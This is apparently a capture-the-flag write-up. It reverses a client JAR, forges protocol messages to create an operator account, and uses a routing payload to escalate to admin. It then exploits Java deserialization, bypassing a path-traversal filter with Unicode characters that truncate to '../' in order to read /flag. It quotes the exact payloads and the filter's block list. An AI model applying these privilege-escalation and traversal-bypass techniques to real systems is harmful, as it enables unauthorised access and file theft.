# Transit Privilege

## Description

A certain operations console is used to manage edge nodes, maintenance tasks, and diagnostic reports. So, what's the problem with the analysis?

## Author

lhRaMk7

## solutions

When this challenge is first opened, the web side does not give away much. It looks like an ordinary login page, and the few visible endpoints such as `/login`, `/admin/me`, and `/api/status` do not immediately expose a useful route. Even `/api/status` is intentionally plain:

```json
{
  "name": "Transit Privilege",
  "login": "POST /login",
  "dashboard": "GET /admin/me",
  "notice": "database-backed auth is enabled"
}
```

So the real starting point is not the page itself but the attachment. The provided file is `edge-agent-client-0.1.0.jar`, and after reversing it, it becomes clear that the client is not talking to an ordinary REST entry first. It upgrades the target into `ws://host/proxy`, and the protocol flow is easy to follow from the code: `HELLO -> AUTH -> DESCRIBE -> CALL`. The signing material is there as well, including the fixed key string:

```text
6Ziy5ZCb5a2Q5LiN5aao5bCP5Lq6ISEh
```

as well as the canonical formats used for `AUTH` and `CALL`. At that point the first half of the challenge stops being “find a hidden web endpoint” and becomes “rebuild the client protocol.”

Once `HELLO` and `AUTH` are working, `DESCRIBE` is the next thing worth looking at. The operation that stands out immediately is `cap.sync`. It is not a one-shot helper call. It is a negotiated flow with a ticket and a proof stage, so it is the kind of thing that often has a persistent side effect. At first the field names alone are only suggestive:

- `identity`
- `principal`
- `secret`

but the live behavior is much more informative than the names. If `secret` is intentionally weak, the server replies with a password-style validation error:

```json
{
  "ok": false,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "rejected",
  "reason": "password must be at least 8 characters and include letters and digits"
}
```

That is the point where the route becomes much clearer. This does not look like an arbitrary configuration field anymore. It looks like a credential. Together with `principal`, it strongly suggests account creation or at least some form of console identity binding.

The flow itself is straightforward once the protocol is understood. First a `HELLO` packet is sent to `/proxy`, and the server answers with:

```json
{
  "ok": true,
  "type": "HELLO_ACK",
  "nonce": "22cc0466020d482e96cc6b1e902bc0d5",
  "profile": "edge-v3",
  "routeEpoch": "rt-a82a95ad0bab",
  "challenge": "b3de52e9e149245f"
}
```

The important values are `nonce`, `profile`, and `routeEpoch`. After `AUTH`, querying `edge.capability` reveals:

```json
{
  "scope": "edge.capability",
  "operations": [
    {
      "name": "cap.sync",
      "routeId": 1724737265,
      "required": ["identity", "principal", "secret"],
      "mode": "negotiated-bind"
    }
  ]
}
```

Submitting a first-stage bind such as:

```json
{
  "identity": "edge-a1b2c3d4",
  "principal": "ua3e351ca84",
  "secret": "Aa910334b81f0614"
}
```

does not complete the process immediately. The server responds with:

```json
{
  "ok": true,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "proof_required",
  "ticket": "1e14737afe79853cdb",
  "resumeScope": "edge.capability.ticket",
  "missing": ["ticket", "proof"]
}
```

This reply already explains the rest of the route. The request is accepted so far, a `ticket` is issued, and the flow must continue under `edge.capability.ticket` with an additional `proof`. After computing the proof exactly as the client does and sending the second-stage request, the server returns:

```json
{
  "ok": true,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "linked",
  "scope": "operator-console",
  "bindingId": "bind-942851708",
  "principal": "ua3e351ca84"
}
```

The most important part is:

```json
"scope": "operator-console"
```

That makes the earlier suspicion easy to verify. The returned `principal/secret` pair can now be used to log into the web console, and the role is `OPERATOR`.

After logging in, the application still does not expose an obvious admin function. The more useful surface is the workspace bootstrap:

```text
GET /api/workspace/bootstrap
```

which returns a set of session-specific action IDs such as:

```json
{
  "workflow": {
    "draftActionId": "12aa370d-365f-44ed-9c28-31db1cda29c2",
    "previewActionId": "0a7e788c-68da-4050-a390-1bfba909638d",
    "submitActionId": "4bdd3e48-4bb6-4859-96a4-bc0785b168c8",
    "advanceActionId": "16a4b417-bda6-429e-b207-6cd850183685"
  }
}
```

This shows that the workflow is exposed through a facade:

```text
POST /api/workspace/action
```

Starting a draft does not immediately create a completed request. Instead, the server replies with:

```json
{
  "ok": true,
  "state": "ROUTING_REQUIRED",
  "draftRef": "wf-7d4996a260cd"
}
```

so the next question becomes obvious: who decides the reviewer and the lane? The preview step gives enough hints to keep following that direction:

```json
{
  "ok": true,
  "state": "ROUTING_REQUIRED",
  "schema": {
    "fields": ["policyRef", "routing"],
    "profiles": ["desk", "delegate"]
  },
  "note": "handoff remains policy-scoped",
  "compat": "retained resolver aliases may still bind"
}
```

Even before seeing the source code, the important words are already there: `policyRef`, `routing`, `handoff`, and `retained`. At that point the natural idea is simple: if the reviewer is decided here, can the routing metadata be pushed back toward the request owner?

The payload that actually works is:

```json
{
  "draftRef": "wf-7d4996a260cd",
  "policyRef": "desk-default",
  "routing": {
    "mode": "retain",
    "handoff": "owner"
  }
}
```

After submitting it, the request lands in the `retain` lane. Advancing it to `APPROVED` and then checking `/admin/me` gives:

```json
{
  "username": "ua3e351ca84",
  "role": "ADMIN"
}
```

So the first half is complete at that point. The remaining job is to find the final read path.

Once `ADMIN` is available, the most useful next step is not blind endpoint enumeration. It is to look for places where the application reveals more of its own internals. In this challenge, that transition from black-box to white-box is intentionally placed in the backup feature. Querying:

```text
GET /api/backup/list
```

reveals a very telling record:

```json
[
  {
    "name": "support-source",
    "state": "ready",
    "profile": "server-source",
    "note": "Server support snapshot with packaged service jar."
  }
]
```

That is already explicit enough: the profile is `server-source`, and the note says that the bundle contains the packaged service JAR. After creating a ticket and fetching the bundle, the archive contains:

```text
ops-console-demo-0.1.0.jar
```

Only from this point onward does the second half become a source-level problem.

With the server JAR available, searching for terms like `reconcile`, `ObjectInputStream`, and `readObject` quickly leads to:

```text
/admin/maintenance/reconcile
```

This route accepts a Base64-encoded ZIP, extracts `manifest.json` and `inventory.dat`, and then deserializes `inventory.dat` with Java native deserialization. The most important class on this path is:

```text
ctf.sctf.ops.maintenance.InventoryCursorEntry
```

Its `readObject()` method calls:

```text
ProbeSandbox.renderSnapshot(name, profile, cursor)
```

and the output of that call is later written into the maintenance report. That makes it the ideal entry for the final stage, because deserialization immediately reaches useful logic and the result can still be recovered afterward.

Looking further into `ops-console-demo-0.1.0.jar`, the actual issue becomes much easier to describe. Once `InventoryCursorEntry.readObject()` passes `cursor` and `profile` onward, `renderSnapshot()` reaches the following chain when `profile=merge`:

```text
BridgeIndexRenderer.renderProfile(...)
-> LegacyCursorAdapter.flattenToken(cursor)
-> IndexSnapshotStore.readSegment(storageToken)
```

The critical part is `LegacyCursorAdapter.flattenToken()`. It does not directly use the original `cursor`. Instead, it iterates over every character and calls:

```java
private static byte bridgeOctet(char codeUnit) {
    return (byte) codeUnit;
}
```

In other words, every Java `char` is truncated into a single `byte`, and only the low 8 bits are kept. `flattenToken()` then rebuilds a new string from those bytes with `ISO_8859_1`. At that moment, the string inspected by the filter and the string actually used for path resolution are no longer the same object in any meaningful sense.

The filter itself appears to block obvious traversal markers such as:

- `../`
- `./`
- `%2e%2e`
- `..%2f`
- `%u002e`

but it only checks the original visible string. If a Unicode character does not visibly look like `.` or `/`, yet its low byte becomes `.` or `/`, the visible check passes while the later materialized string becomes a real traversal path.

That is exactly what happens here. For example:

- `售` becomes `.`
- `启` becomes `/`
- `书`, `公`, `卡`, and `剧` can become `f`, `l`, `a`, and `g`

So the visible string:

```text
售售启售售启售售启书公卡剧
```

is later materialized into:

```text
../../../flag
```

After `resolve().normalize()`, the final target becomes:

```text
/flag
```

From there, the remaining work is direct. A crafted `InventoryCursorEntry` is placed into `inventory.dat`, a valid `manifest.json` is included, the ZIP is Base64-encoded and submitted to:

```text
POST /admin/maintenance/reconcile
```

The server returns an `importId`, and querying:

```text
GET /admin/maintenance/reports?importId=<importId>
```

returns the final output. The recovered flag is:

```text
SCTF{Tr4ns1t_Pr0b3_4107_M@sTer}
```

Looking back, none of the individual steps is especially large on its own. What makes the challenge work is the way the pieces are separated across different layers: the first half is exposed through a client JAR instead of obvious web routes, the privilege escalation is hidden inside a workspace facade, the source code is not given immediately but must be obtained through backup, and the final file-read issue is not a plain visible `../` but a mismatch between the visible representation and the string that is actually consumed later.
